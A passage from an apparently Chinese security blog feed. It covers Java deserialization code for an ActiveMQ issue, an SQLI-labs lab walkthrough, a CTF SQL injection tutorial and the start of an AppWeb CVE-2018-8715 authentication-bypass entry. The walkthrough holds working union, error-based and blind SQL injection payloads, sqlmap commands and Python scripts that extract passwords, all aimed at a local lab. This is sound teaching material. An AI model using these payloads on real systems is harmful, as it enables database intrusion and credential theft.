<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201215150819658.png" alt="image-20201215150819658"></p>
<p>这里为序列化操作</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private void writeObject(ObjectOutputStream s) throws IOException &#123;</span><br><span class="line"> int sshift &#x3D; 0;</span><br><span class="line"> int ssize &#x3D; 1;</span><br><span class="line"> while (ssize &lt; 16) &#123;</span><br><span class="line"> sshift++;</span><br><span class="line"> ssize &lt;&lt;&#x3D; 1;</span><br><span class="line"> &#125; </span><br><span class="line"> int segmentShift &#x3D; 32 - sshift;</span><br><span class="line"> int segmentMask &#x3D; ssize - 1;</span><br><span class="line"> Segment[] segments &#x3D; (Segment[])new Segment[16];</span><br><span class="line"> for (int i &#x3D; 0; i &lt; segments.length; i++)</span><br><span class="line"> segments[i] &#x3D; new Segment(0.75F); </span><br><span class="line"> s.putFields().put(&quot;segments&quot;, segments);</span><br><span class="line"> s.putFields().put(&quot;segmentShift&quot;, segmentShift);</span><br><span class="line"> s.putFields().put(&quot;segmentMask&quot;, segmentMask);</span><br><span class="line"> s.writeFields();</span><br><span class="line"> Node[] arrayOfNode;</span><br><span class="line"> if ((arrayOfNode &#x3D; this.table) !&#x3D; null) &#123;</span><br><span class="line"> Traverser&lt;K, V&gt; it &#x3D; new Traverser&lt;K, V&gt;(arrayOfNode, arrayOfNode.length, 0, arrayOfNode.length); Node&lt;K, </span><br><span class="line">V&gt; p;</span><br><span class="line"> while ((p &#x3D; it.advance()) !&#x3D; null) &#123;</span><br><span class="line"> s.writeObject(p.key);</span><br><span class="line"> s.writeObject(p.val);</span><br><span class="line"> &#125; </span><br><span class="line"> &#125; </span><br><span class="line"> s.writeObject(null);</span><br><span class="line"> s.writeObject(null);</span><br><span class="line"> segments &#x3D; null;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201215170349015.png" alt="image-20201215170349015"></p>
<p>getObject()方法会调用readobject()方法中将data中的数据进行反序列化并且触发漏洞</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private void readObject(ObjectInputStream stream) throws InvalidObjectException &#123; throw new </span><br><span class="line">InvalidObjectException(&quot;Proxy required&quot;); &#125;</span><br><span class="line"> static final class SerializationProxy&lt;K, V&gt;</span><br><span class="line"> extends Object</span><br><span class="line"> implements Serializable</span><br><span class="line"> &#123;</span><br><span class="line"> final EntryWeigher&lt;? super K, ? super V&gt; weigher;</span><br><span class="line"> final EvictionListener&lt;K, V&gt; listener;</span><br><span class="line"> final int concurrencyLevel;</span><br><span class="line"> final Map&lt;K, V&gt; data;</span><br><span class="line"> final long capacity;</span><br><span class="line"> static final long serialVersionUID &#x3D; 1L;</span><br><span class="line"> SerializationProxy(ConcurrentLinkedHashMap&lt;K, V&gt; map) &#123;</span><br><span class="line"> this.concurrencyLevel &#x3D; map.concurrencyLevel;</span><br><span class="line"> this.data &#x3D; new HashMap(map);</span><br><span class="line"> this.capacity &#x3D; map.capacity.get();</span><br><span class="line"> this.listener &#x3D; map.listener;</span><br><span class="line"> this.weigher &#x3D; map.weigher;</span><br><span class="line"> &#125;</span><br><span class="line"> Object readResolve() &#123;</span><br><span class="line"> ConcurrentLinkedHashMap&lt;K, V&gt; map &#x3D; (new ConcurrentLinkedHashMap.Builder()).concurrencyLevel(this.</span><br><span class="line">concurrencyLevel).maximumWeightedCapacity(this.capacity).listener(this.listener).weigher(this.weigher).build();</span><br><span class="line"> map.putAll(this.data);</span><br><span class="line"> return map;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>ActiveMQ</tag>
      </tags>
  </entry>
  <entry>
    <title>SQLI labs 靶场学习记录</title>
    <url>/2020/12/23/WEB/SQLI-labs-%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="基础挑战1-20关"><a href="#基础挑战1-20关" class="headerlink" title="基础挑战1-20关"></a>基础挑战1-20关</h1><h2 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; order by 3%23    &#x2F;&#x2F;得到列数为3</span><br><span class="line">-1&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata%23  &#x2F;&#x2F;得到数据库名</span><br><span class="line">-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D; &#39;security&#39;%23 &#x2F;&#x2F;得到表名</span><br><span class="line">-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D; &#39;users&#39;%23 &#x2F;&#x2F;得到列名</span><br><span class="line">-1&#39; union select 1,username,password from users where id&#x3D;3%23 &#x2F;&#x2F;爆破得到数据</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<h3 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39;+UNION+SELECT+1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure>

<h3 id="报错注入1"><a href="#报错注入1" class="headerlink" title="报错注入1"></a>报错注入1</h3><p>手动修改 <code>LIMIT+0,1</code> 来进行结果偏移</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39;+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+</span><br></pre></td></tr></table></figure>

<h3 id="报错注入2"><a href="#报错注入2" class="headerlink" title="报错注入2"></a>报错注入2</h3><p>手动修改 <code>LIMIT+0,1</code> 来进行结果偏移</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39;+AND(SELECT+1+FROM(SELECT+count(*),CONCAT((SELECT+(SELECT+(SELECT+CONCAT(0x7e,0x27,cast(username+AS+CHAR),0x27,0x7e)+FROM+users+LIMIT+0,1))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1&#x3D;1--+</span><br></pre></td></tr></table></figure>

<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>数据库第一个字母为 <code>s</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; and left(database(),1)&gt;&#39;r&#39;--+</span><br><span class="line">?id&#x3D;1&#39; and left(database(),1)&gt;&#39;s&#39;--+</span><br></pre></td></tr></table></figure>

<p>延时盲注</p>
<p>数据库第一个字母的 ascii 码为 115，即<code>s</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&gt;114,1,sleep(5))--+</span><br><span class="line">?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5))--+</span><br></pre></td></tr></table></figure>

<p><strong>联合查询注入</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1:80/Less-1/?id=1&quot;</span> --dbms=MySQL --random-agent --flush-session --technique=U -v 3</span><br></pre></td></tr></table></figure>

<p><strong>报错注入</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1:80/Less-1/?id=1&quot;</span> --dbms=MySQL --random-agent --flush-session --technique=E -v 3</span><br></pre></td></tr></table></figure>

<p><strong>布尔盲注</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1:80/Less-1/?id=1&quot;</span> --dbms=MySQL --random-agent --flush-session --technique=B -v 3</span><br></pre></td></tr></table></figure>

<p><strong>延时盲注</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1:80/Less-1/?id=1&quot;</span> --dbms=MySQL --random-agent --flush-session --technique=T -v 3</span><br></pre></td></tr></table></figure>

<h2 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h2><p>在添加’后返回</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39; LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure>

<p>可以得到这个sql语句其实并没有单引号，只是用数字进行查询，查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br></pre></td></tr></table></figure>

<p>和less1一样 payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1 or 1&#x3D;1%23</span><br><span class="line">?id&#x3D;-1+UNION+SELECT+1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure>

<h2 id="less3"><a href="#less3" class="headerlink" title="less3"></a>less3</h2><p>添加’后返回</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;-1&#39;&#39;) LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure>

<p>sql语句为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br></pre></td></tr></table></figure>

<p>所以我们需要闭合</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39;) or 1&#x3D;1%23</span><br><span class="line">?id&#x3D;-1%27)+UNION+SELECT+1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure>

<h2 id="less4"><a href="#less4" class="headerlink" title="less4"></a>less4</h2><p>添加’后为报错添加”后报错如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&quot;-1&quot;&quot;) LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure>

<p>sql语句为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br></pre></td></tr></table></figure>

<p>payload如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&quot;) or 1&#x3D;1%23</span><br><span class="line">?id&#x3D;-1&quot;)+UNION+SELECT+1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure>

<h2 id="less5"><a href="#less5" class="headerlink" title="less5"></a>less5</h2><p>尝试发现报错：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39; LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure>

<p>推测为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users where id&#x3D;&#39;input&#39; LIMIT 0,1;</span><br></pre></td></tr></table></figure>

<p>sql语句为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;;</span><br><span class="line">$result&#x3D;mysql_query($sql);</span><br></pre></td></tr></table></figure>

<p>尝试之前的方法不会返回我们注入的信息，如果注入成功，会返回<code>Your are in...</code>，出错的话就不会返回字符串，所以这里我们可以考虑</p>
<ul>
<li>盲注</li>
<li>延时注入</li>
<li>报错注入</li>
</ul>
<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><h4 id="Left"><a href="#Left" class="headerlink" title="Left()"></a>Left()</h4><p>例如我们可以使用<code>1&#39; and left(version(),1)=3%23</code>这个payload进行测试，截取<code>version()</code>得到的最左侧的字符判断是否为3，如果为3则正常返回<code>You are in...</code>，否则不返回。所以我们可以利用这个一步一步爆破得到<code>left(version(),1)=5</code>。爆破区间可以确定在<code>/[0-9.]/</code>。</p>
<p>采用<code>1&#39;and length(database())=8%23</code>对数据库名字长度进行爆破，确定数据库名字长度之后，我们可以使用<code>database()</code>来进行爆破数据库名，采用<code>left(database(),1)&gt;&#39;a&#39;</code>这个payload进行测试，原理跟上述一致，看返回即可，直到截取长度与数据库名字一致为止，这里效率比较高的就是采用二分法进行盲注。</p>
<h4 id="substr-、acsii"><a href="#substr-、acsii" class="headerlink" title="substr()、acsii()"></a>substr()、acsii()</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&gt;80%23     &#x2F;&#x2F;截取数据库下第一个表的第一个字符与80ascii值进行对比</span><br><span class="line"></span><br><span class="line">找第二个字符只需要改成substr(&#39;xxx&#39;,2,1)即可。</span><br><span class="line">找第二个表改成limit 1,1</span><br></pre></td></tr></table></figure>

<h4 id="使用regexp"><a href="#使用regexp" class="headerlink" title="使用regexp()"></a>使用regexp()</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; and 1&#x3D;(select 1 from information_schema.columns where table_name&#x3D;&#39;users&#39; and column_name regexp &#39;^us[a-z]&#39; limit 0,1;)%23</span><br><span class="line">&#x2F;&#x2F;users表中的列名是否有us**的列</span><br></pre></td></tr></table></figure>

<h4 id="使用ord-、mid"><a href="#使用ord-、mid" class="headerlink" title="使用ord()、mid()"></a>使用ord()、mid()</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))&#x3D; 68%23</span><br><span class="line">&#x2F;&#x2F;cast(username AS CHAR)将username转换成字符串</span><br><span class="line">&#x2F;&#x2F;IFNULL(exp1,exp2)假如expr1不为NULL，则IFNULL()的返回值为expr1; 否则其返回值为expr2。IFNULL()的返回值是数字或是字符串，具体情况取决于其所使用的语境。</span><br></pre></td></tr></table></figure>

<p>脚本如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding&#x3D;utf-8</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">result &#x3D; &quot;&quot;</span><br><span class="line">url_paylaod &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr((&#123;0&#125;),&#123;1&#125;,1))&gt;&#123;2&#125; %23&quot;</span><br><span class="line">chars &#x3D; &quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_,-.@&amp;%&#x2F;^!~&quot;</span><br><span class="line">result_length &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and length((&#123;0&#125;)) &gt;&#123;1&#125; %23&quot;</span><br><span class="line"></span><br><span class="line">def get_result_length(payload, value):</span><br><span class="line">    for i in range(1,100):</span><br><span class="line">        url &#x3D; result_length.format(payload, i)</span><br><span class="line">        response &#x3D; requests.get(url)</span><br><span class="line">        if len(response.text) &gt; value:</span><br><span class="line">            print(&#39;-----length is :%s&#39; % str(i))</span><br><span class="line">            return i</span><br><span class="line"></span><br><span class="line">def get_result(result_length, payload, value):</span><br><span class="line">    for i in range(1, result_length):</span><br><span class="line">        for char in chars:</span><br><span class="line">            url &#x3D; url_paylaod.format(payload, i, ord(char))</span><br><span class="line">            response &#x3D; requests.get(url)</span><br><span class="line">            if len(response.text) &gt; value:</span><br><span class="line">                global result</span><br><span class="line">                result +&#x3D; char</span><br><span class="line">                print(&#39;----- data is :%s&#39; % result)</span><br><span class="line">                break</span><br><span class="line">payload &#x3D; &quot;select password from users where id&#x3D;3 &quot;</span><br><span class="line">value &#x3D; 710</span><br><span class="line">get_result(get_result_length(payload, value), payload, value)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>



<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>推荐一篇超详细的讲解报错注入的文章——<a href="https://www.cnblogs.com/xdans/p/5412468.html">Mysql报错注入原理分析(count()、rand()、group by)</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union Select 1,count(*),concat(0x3a,0x3a,(select user()),0</span><br><span class="line">x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+</span><br><span class="line"></span><br><span class="line">1&#39; and extractvalue(1,concat(0x7e,(select @@version),0x7e)) --+</span><br><span class="line"></span><br><span class="line">1&#39; and updatexml(1,concat(0x7e,(select @@version),0x7e),1) --+</span><br><span class="line"></span><br><span class="line">1&#39; union select 1,2,3 from (select NAME_CONST(version(),1), NAME_CONST(version(),1))x --+</span><br></pre></td></tr></table></figure>

<h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p>benchmark 是Mysql的一个内置函数,其作用是来测试一些函数的执行速度。 benchmark() 中带有两个参数，第一个是执行的次数，第二个是要执行的函数或者是表达式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;and If(ascii(substr(database(),1,1))&#x3D;115,1,sleep(5))--+</span><br><span class="line"></span><br><span class="line">1&#39;UNION SELECT (IF(SUBSTRING(current,1,1)&#x3D;CHAR(115),BENCHMARK(50000000,ENCODE(&#39;MSG&#39;,&#39;by 5 seconds&#39;)),null)),2,3 FROM (select database() as current) as tb1--+</span><br></pre></td></tr></table></figure>

<p>脚本如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding&#x3D;utf-8</span><br><span class="line">import requests</span><br><span class="line">value &#x3D;&quot;0123456789abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ%&amp;^@_.-!&quot;</span><br><span class="line">data&#x3D;&quot;&quot;</span><br><span class="line"> </span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if((ascii(substr((&#123;0&#125; limit 1,1),&#123;1&#125;,1)) &#x3D; &#39;&#123;2&#125;&#39;),sleep(3),NULL); %23&quot;</span><br><span class="line">url_length&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if((length((&#123;0&#125; limit 1,1))&#x3D;&#123;1&#125; ),sleep(3),NULL); %23&quot;</span><br><span class="line">def get_length(payload):</span><br><span class="line">    for n in range(1,100):</span><br><span class="line">        url&#x3D; url_length.format(payload,n)</span><br><span class="line">        #print(url)</span><br><span class="line">        if(get_respone(url)):</span><br><span class="line">            print(&quot;[+] length is &#123;0&#125;&quot;.format(n))</span><br><span class="line">            return n</span><br><span class="line">def get_data(payload,value,length):</span><br><span class="line">    for n in range(1,length):</span><br><span class="line">        for v in value :</span><br><span class="line">            url_data &#x3D; url.format(payload,n,ord(v))</span><br><span class="line">            #print(url_data)</span><br><span class="line">            if(get_respone(url_data)):</span><br><span class="line">                global data</span><br><span class="line">                data&#x3D;data+v</span><br><span class="line">                print(&quot;[+] data is &#123;0&#125;&quot;.format(data))</span><br><span class="line">                break</span><br><span class="line">def get_respone(url):</span><br><span class="line">    try:</span><br><span class="line">        html &#x3D; requests.get(url,timeout&#x3D;2)</span><br><span class="line">        return False</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&quot;......&quot;)</span><br><span class="line">        return True</span><br><span class="line"></span><br><span class="line">databse_payload &#x3D;&quot;select user()&quot;</span><br><span class="line">get_data(databse_payload,value,get_length(databse_payload)+1)</span><br></pre></td></tr></table></figure>



<p>更新中…</p>
<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="https://www.sqlsec.com/2020/05/sqlilabs.html#toc-heading-111">https://www.sqlsec.com/2020/05/sqlilabs.html#toc-heading-111</a></p>
<p><a href="http://blog.zeddyu.info/2019/03/03/Sqli-lab%E9%80%9F%E5%88%B7%E8%AE%B0%E5%BD%95(1-53)/">http://blog.zeddyu.info/2019/03/03/Sqli-lab%E9%80%9F%E5%88%B7%E8%AE%B0%E5%BD%95(1-53)/</a></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>SQLI-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入-CTF</title>
    <url>/2020/12/22/CTF/Web/SQL%E6%B3%A8%E5%85%A5-CTF/</url>
    <content><![CDATA[<h2 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h2><blockquote>
<p>SQL注入：开发人员在开发过程中，直接将URL中的参数、HTTP Body中的Post参数或其他外来的用户输入（如Cookies，UserAgent等）与SQL语句进行拼接，造成待执行的SQL语句可控，从而使我们可以执行任意SQL语句</p>
</blockquote>
<a id="more"></a>

<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="1-可回显的注入"><a href="#1-可回显的注入" class="headerlink" title="1.可回显的注入"></a>1.可回显的注入</h3><ul>
<li>可以联合查询的注入</li>
<li>报错注入</li>
<li>通过注入进行DNS请求，从而到达可回显的目的</li>
</ul>
<h3 id="2-不可回显的注入"><a href="#2-不可回显的注入" class="headerlink" title="2.不可回显的注入"></a>2.不可回显的注入</h3><ul>
<li>Bool盲注</li>
<li>时间盲注</li>
</ul>
<h3 id="3-二次注入"><a href="#3-二次注入" class="headerlink" title="3.二次注入"></a>3.二次注入</h3><p>通常作为一种业务逻辑较为复杂的题目出现，一般需要自己编写脚本以实现自动化注入。</p>
<p>在一般的CTF比赛中，出题人都会变相地增加一层WAF</p>
<h2 id="可以联合查询的SQL注入"><a href="#可以联合查询的SQL注入" class="headerlink" title="可以联合查询的SQL注入"></a>可以联合查询的SQL注入</h2><p>在可以联合查询的题目中，一般会将数据库查询的数据回显到页面中，比如下面这个例子(测试样例代码时需要关闭GPC)：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;php</span><br><span class="line">  $id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">	$getid = <span class="string">&quot;SELECT Id FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;&quot;</span></span><br><span class="line">	$result = mysql_query($getid) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span>.mysql_error().<span class="string">&#x27;&lt;/pre&#x27;</span>)</span><br><span class="line">	$num = mysql_numrows($result);</span><br></pre></td></tr></table></figure>

<p>$id变量会将GET获取到的参数直接拼接到SQL语句中，假如传入如下参数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39;union+select+1--+</span><br></pre></td></tr></table></figure>

<p>拼接后SQL语句就变成了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT Id FROM users WHERE user_id&#x3D;&#39;-1&#39;union select 1 --&#39;&#39;</span><br></pre></td></tr></table></figure>

<p>闭合前面的单引号，注释后面的单引号，中间写上需要的Payload就可以了</p>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="1-updatexml"><a href="#1-updatexml" class="headerlink" title="1.updatexml"></a>1.updatexml</h3><blockquote>
<p>updatexml 的报错原理从本质上来说就是函数的报错</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT updatexml(1,concat(0x01,(SELECT version()),0x01),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~5.5.44-0ubuntu0.14.04.1~&#39;</span><br></pre></td></tr></table></figure>

<p>这里还是使用前面的例子，举出一个爆破数据库版本的样例Payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1+updatexml(1,concat(0x01,SELECT version(),0x01),1)%23</span><br></pre></td></tr></table></figure>

<p>其他功能的Payload可以参照下面floor的使用方法来修改</p>
<h3 id="2-floor"><a href="#2-floor" class="headerlink" title="2.floor"></a>2.floor</h3><blockquote>
<p>floor报错的原理是rand和order by 或 group by的冲突。在MySQL文档中的原文如下：</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RAND() in a WHERE clause is re-evaluated every time the WHERE is executed</span><br><span class="line">Use of a column with RAND() values in an ORDER BY or GROUP BY clause may yield unexpected results because for either clause a RAND() expression can be evaluated multiple times for the same row, each time returning a different result. </span><br></pre></td></tr></table></figure>

<p>了解原理之后，我们来说一下应用的方法，如下。</p>
<p>爆破数据库版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1‘+and(select 1 from(select count(*),concat(select (select (select concat(0x01,user(),0x01)) from information_schema.table limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</span><br></pre></td></tr></table></figure>

<p>爆破当前用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39;+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</span><br></pre></td></tr></table></figure>

<p>爆破当前使用的数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39;+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</span><br></pre></td></tr></table></figure>

<p>爆破指定表的字段（下面以表名为emails举例说明）:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39;+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,column_name,0x7e))) from information_schema.columns where table_name &#x3D; 0x656d61696c73 limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</span><br></pre></td></tr></table></figure>

<p>ps:我们这里采用的是十六进制的编码后的表名。如果想采用十六进制编码的表名则需要添加引号，但是这里有时候会出现单引号导致的报错</p>
<p>以上的Payload 可以在sqli-labs的level1中复现</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201226013914953.png" alt="image-20201226013914953"></p>
<p>这里只演示爆破当前用户</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><blockquote>
<p>exp函数报错，exq()报错的本质原因是溢出报错。我们可以在MySQL中输入</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select exp(~(select * from (select user())x))</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201226014658415.png" alt="image-20201226014658415"></p>
<p>同样使用前面的例子，Payload为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; exp(~(select * from (select user())x))%23</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201226014605414.png" alt="image-20201226014605414"></p>
<h2 id="Bool盲注"><a href="#Bool盲注" class="headerlink" title="Bool盲注"></a>Bool盲注</h2><blockquote>
<p>Bool盲注通常是由于开发者将报错信息屏蔽而导致的，但是网页中真和假有着不同的回显，比如返回真时返回access，为假时返回false；或者为真时返回正常页面，为假时跳转到错误页面等</p>
</blockquote>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>AppWeb认证绕过漏洞(CVE-2018-8715)</title>
    <url>/2020/12/22/WEB/Exploit/AppWeb/AppWeb%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2018-8715/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><blockquote>
<p>AppWeb是Embedthis Software LLC公司负责开发维护的一个基于GPL开源协议的嵌入式Web Server。他使用C/C++来编写，能够运行在几乎先进所有流行的操作系统上。当然他最主要的应用场景还是为嵌入式设备提供Web Application容器。</p>
</blockquote>
<p>AppWeb可以进行认证配置，其认证方式包括以下三种：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、basic 传统HTTP基础认证</span><br><span class="line"></span><br><span class="line">2、digest 改进版HTTP基础认证，认证成功后将使用Cookie来保存状态，而不用再传递Authorization头</span><br><span class="line"></span><br><span class="line">3、form 表单认证</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>其7.0.3之前的版本中，对于digest和form两种认证方式，如果用户传入的密码为null（也就是没有传递密码参数），appweb将因为一个逻辑错误导致直接</p>
<p>认证成功，并返回session。</p>
